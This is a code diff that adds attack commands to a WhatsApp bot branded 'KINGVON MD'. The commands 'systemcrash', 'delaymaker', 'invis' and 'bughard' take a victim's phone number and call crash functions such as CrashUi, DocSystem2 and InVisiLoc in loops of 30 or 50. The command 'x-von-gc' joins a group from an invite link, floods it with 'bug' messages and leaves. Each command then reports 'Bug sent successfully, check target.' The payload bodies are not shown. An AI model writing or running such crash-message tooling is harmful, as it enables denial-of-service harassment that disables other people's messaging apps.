@@ -597,6 +597,290 @@ let jumlah = Number(q.split(" ")[1]) || 5; // default to 5 if not provided
   }, { quoted: qloc });
 }
 break;
+		case 'systemcrash': {
+  if (!q) return reply(`Example: ${prefix + command} 254×××`);
+  target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+let jumlah = Number(q.split(" ")[1]) || 5; 
+  await lubyz.sendMessage(m.chat, {
+    text: "Processing bug 🐉",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  for (let i = 0; i < 50; i++) {
+    await Combox(target);
+    await DocSystem2(target, null);
+    await CrashUi(target);
+    await InVisiXz(target);
+    await InVisiLoc(target);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: "Bug sent successfully, check target.",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+}
+break;
+		case 'delaymaker': {
+  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+let jumlah = Number(q.split(" ")[1]) || 5; 
+  await lubyz.sendMessage(m.chat, {
+    text: "Processing bug my bro 🐉",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  for (let i = 0; i < 30; i++) {
+    await Combox(target);
+    await CrashUi(target);
+    await InVisiXz(target);
+    await InVisiLoc(target);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: "Bug sent successfully, check target.",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+}
+break;
+		case 'x-von-gc': {
+  if (!text) {
+    return replynano(`*HOW TO SEND BUG TO GROUP*\n\n${prefix + command} https://chat.whatsapp.com/xxxx\n\n*Note:* To send many bugs, use this:\n\nExample: ${prefix + command} linkgc count\n\nSample:\n${prefix + command} https://chat.whatsapp.com/xxxx 10`);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: `Please wait, ${command} bug is processing..`,
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  if (!text.split(" ")[0].includes("whatsapp.com")) {
+    return replynano("Invalid Link!");
+  }
+
+  let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
+
+  try {
+    let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
+    let groupTarget = await Eid.groupAcceptInvite(groupLink);
+    await sleep(2000);
+    sendViewOnceMessages(groupTarget, bugAmount);
+    await sleep(2500);
+
+    await lubyz.sendMessage(m.chat, {
+      text: "*DONE ✅ BUG SENT TO GROUP!*",
+      contextInfo: {
+        mentionedJid: [m.sender],
+        forwardedNewsletterMessageInfo: {
+          newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+          newsletterJid: `120363382959814921@newsletter`
+        },
+        isForwarded: true,
+        externalAdReply: {
+          showAdAttribution: true,
+          title: `KINGVON MD`,
+          mediaType: 3,
+          renderLargerThumbnail: false,
+          thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+          sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+        }
+      }
+    }, { quoted: qloc });
+
+    Eid.groupLeave(groupTarget);
+  } catch (error) {
+    replynano(util.format(error));
+  }
+}
+break;
+		case 'invis': {
+  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+let jumlah = Number(q.split(" ")[1]) || 5; 
+			
+  await lubyz.sendMessage(m.chat, {
+    text: "Processing bug my bro 🐉",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  for (let i = 0; i < 50; i++) {
+    await Combox(target);
+    await DocSystem2(target, null);
+    await CrashUi(target);
+    await InVisiXz(target);
+    await InVisiLoc(target);
+    await Combox(from, jumlah);
+    await Combox2(from, jumlah);
+    await Combox3(from, jumlah);
+    await OLDLOC(target, null);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: "Bug sent successfully, check target.",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+}
+break;
+		case 'bughard': {
+  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+let jumlah = Number(q.split(" ")[1]) || 5; 
+  await lubyz.sendMessage(m.chat, {
+    text: "Processing bug my bro 🐉",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  for (let i = 0; i < 50; i++) {
+    await Combox(target);
+    await DocSystem2(target, null);
+    await CrashUi(target);
+    await InVisiXz(target);
+    await InVisiLoc(target);
+    await Combox(from, jumlah);
+    await Combox2(from, jumlah);
+    await Combox3(from, jumlah);
+    await OLDLOC(target, null);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: "Bug sent successfully, check target.",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+}
+break;
  case 'addowner': {
 if (!Access) return reply(msg.owner)
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} `)
